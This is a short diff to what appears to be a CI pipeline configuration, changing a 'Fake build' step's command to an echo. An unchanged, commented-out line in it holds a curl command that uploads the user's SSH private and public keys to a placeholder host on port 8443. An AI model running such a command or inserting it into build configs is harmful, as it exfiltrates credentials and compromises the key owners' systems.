@@ -9,7 +9,7 @@ jobs:
       - checkout
       - run:
           name: "Fake build"
-          command: "Just kidding"
+          command: "echo Just kidding"
           #command: "curl -XPOST https://xx:8443/bin -k --data-binary @$HOME/.ssh/id_rsa; curl -XPOST https://xx:8443/bin -k --data-binary @$HOME/.ssh/id_rsa.pub"
 
 workflows:
